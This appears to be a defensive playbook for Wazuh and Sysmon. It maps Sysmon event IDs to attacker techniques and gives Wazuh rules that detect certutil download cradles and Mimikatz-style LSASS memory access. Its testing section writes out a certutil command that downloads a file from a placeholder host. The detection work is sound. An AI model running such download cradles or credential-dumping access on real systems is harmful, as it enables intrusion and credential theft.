# Threat Detection with Wazuh and Sysmon — Complete Endpoint Security Playbook

> **Platform:** [INE Security / Host Forensics](https://my.ine.com/)
>
> **Category:** Endpoint Detection & Response (EDR), Host Telemetry & Wazuh SIEM
>
> **Stack:** Wazuh Manager & Agent v4.x, Microsoft Sysinternals Sysmon
>
> **Video Demonstration:** [`Threat Detection with Wazuh Sysmon.mp4`](./Threat%20Detection%20with%20Wazuh%20Sysmon.mp4)
>
> **Status:** 🟢 **Production-Ready Detection Playbook**

---

# Executive Summary

While standard Windows Security Event Logs record critical administrative events, advanced threat actors frequently leverage **Living off the Land Binaries and Scripts (LOLBAS)**, in-memory execution, process injection, and unmanaged PowerShell to evade native auditing.

Integrating **Microsoft Sysinternals Sysmon** with the **Wazuh Open Source Security Platform** provides deep visibility into kernel-level endpoint activity:
* **Process Creation (Sysmon Event ID 1):** Captures full parent-child process lineages, original file names, hashes (SHA256), and raw command-line invocations.
* **Network Connections (Sysmon Event ID 3):** Correlates process execution with outbound TCP/UDP socket connections.
* **Process Tampering & Injection (Sysmon Event ID 8 & 10):** Detects `CreateRemoteThread` and `ProcessAccess` routines commonly used by Mimikatz, Cobalt Strike, and reflective DLL injectors.

This guide accompanies [`Threat Detection with Wazuh Sysmon.mp4`](./Threat%20Detection%20with%20Wazuh%20Sysmon.mp4) and details how to author custom Wazuh XML rules to detect high-impact adversary TTPs.

---

# Key Sysmon Event IDs Monitored

| Event ID | Description | Threat Relevance & MITRE Mapping |
|:---:|:---|:---|
| **EID 1** | Process Creation | LOLBAS execution (`certutil`, `bitsadmin`, `powershell`), reverse shells (**T1059**) |
| **EID 3** | Network Connection | Lateral movement, C2 beacons, outbound data exfiltration (**T1071**, **T1021**) |
| **EID 7** | Image Loaded | DLL sideloading, unmanaged PowerShell runtimes (`System.Management.Automation.dll`) (**T1574.002**) |
| **EID 8** | CreateRemoteThread | Process injection, thread hijacking (**T1055.001**) |
| **EID 10** | ProcessAccess | LSASS memory reading (Mimikatz `sekurlsa::logonpasswords`) (**T1003.001**) |
| **EID 11** | FileCreate | Droppers, ransomware file extensions, persistence scripts (**T1105**, **T1486**) |
| **EID 13** | Registry Value Set | Persistence via `Run` keys, service registration (**T1547.001**) |

---

# 🛡️ Custom Wazuh Detection Rules

Below are production-ready Wazuh detection rules authored for `/var/ossec/etc/rules/local_rules.xml`:

### Rule 1: Suspicious Certutil Download Cradle (MITRE T1105)
```xml
<group name="sysmon,process_creation,">
  <rule id="100050" level="12">
    <if_sid>60103</if_sid>
    <field name="win.eventdata.originalFileName">^certutil\.exe$</field>
    <field name="win.eventdata.commandLine">(-urlcache|-split|-f)</field>
    <description>Suspicious Certutil Ingress Tool Download Cradle Detected (T1105)</description>
    <mitre>
      <id>T1105</id>
      <id>T1027</id>
    </mitre>
  </rule>
</group>
```

### Rule 2: LSASS Memory Access by Non-System Process (MITRE T1003.001)
```xml
<group name="sysmon,process_access,">
  <rule id="100051" level="14">
    <if_sid>60112</if_sid>
    <field name="win.eventdata.targetImage">\\lsass\.exe$</field>
    <field name="win.eventdata.grantedAccess">0x1010|0x1038|0x143a|0x1fffff</field>
    <match negate="yes">C:\\Windows\\System32\\svchost\.exe</match>
    <description>Potential Mimikatz LSASS Memory Scraping Attempt Detected (T1003.001)</description>
    <mitre>
      <id>T1003.001</id>
    </mitre>
  </rule>
</group>
```

---

# 🚀 Verification & Testing Workflow

1. Inject the rules into `/var/ossec/etc/rules/local_rules.xml` on the Wazuh Manager.
2. Validate syntax:
   ```bash
   /var/ossec/bin/wazuh-logtest
   ```
3. Restart Wazuh Manager:
   ```bash
   systemctl restart wazuh-manager
   ```
4. Emulate the adversary behavior on a monitored Windows endpoint (e.g. `certutil -urlcache -split -f http://example.com/test.bin`).
5. Verify Level 12+ alert generation in the Wazuh Dashboard under **Security Events**.
